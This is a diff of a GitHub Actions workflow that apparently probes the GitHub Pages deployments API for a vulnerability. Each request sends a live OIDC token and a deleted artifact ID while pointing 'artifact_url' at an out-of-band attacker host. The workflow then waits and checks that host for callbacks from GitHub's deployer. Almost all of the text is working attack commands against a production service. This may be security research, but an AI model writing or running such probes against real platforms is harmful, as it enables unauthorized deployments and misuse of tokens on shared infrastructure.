@@ -23,15 +23,14 @@ jobs:
           TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r .value)
           echo "::add-mask::$TOKEN"
           API="https://api.github.com/repos/$GITHUB_REPOSITORY/pages/deployments"
-          echo "===== CONTROL: tunnel reachable ====="
-          curl -s "https://$OOB/control-pre" || true
+          DELETED_ART=10910011657
           echo "===== CONTROL: artifact_url ONLY (expect 400) ====="
           curl -s -w '\nHTTP %{http_code}\n' -X POST -H "Authorization: token $GH_TOKEN" -H "Accept: application/vnd.github+json" "$API" \
             -d "{\"artifact_url\":\"https://$OOB/_apis/pipelines/1/runs/1/artifacts?arm=ctl\",\"pages_build_version\":\"$GITHUB_SHA\",\"oidc_token\":\"$TOKEN\",\"environment\":\"github-pages\"}"
           sleep 3
-          echo "===== ARM: EXPIRED artifact_id + arbitrary artifact_url ====="
+          echo "===== ARM: DELETED artifact_id + arbitrary artifact_url ====="
           curl -s -w '\nHTTP %{http_code}\n' -X POST -H "Authorization: token $GH_TOKEN" -H "Accept: application/vnd.github+json" "$API" \
-            -d "{\"artifact_id\":10387063794,\"artifact_url\":\"https://$OOB/bf45db64-capture/_apis/pipelines/1/runs/1/artifacts?artifactName=github-pages\",\"pages_build_version\":\"$GITHUB_SHA\",\"oidc_token\":\"$TOKEN\",\"environment\":\"github-pages\"}"
-          echo "===== WAIT for deployer callbacks ====="
-          for i in 1 2 3 4; do sleep 15; echo "tick $((i*15))s"; done
-          curl -s "https://$OOB/control-post" || true
+            -d "{\"artifact_id\":$DELETED_ART,\"artifact_url\":\"https://$OOB/bf45db64-v3/_apis/pipelines/1/runs/1/artifacts?artifactName=github-pages\",\"pages_build_version\":\"$GITHUB_SHA\",\"oidc_token\":\"$TOKEN\",\"environment\":\"github-pages\"}"
+          echo "===== WAIT for deployer ====="
+          for i in 1 2 3 4 5 6; do sleep 15; echo "tick $((i*15))s"; done
+          curl -s "https://$OOB/control-post-v3" || true
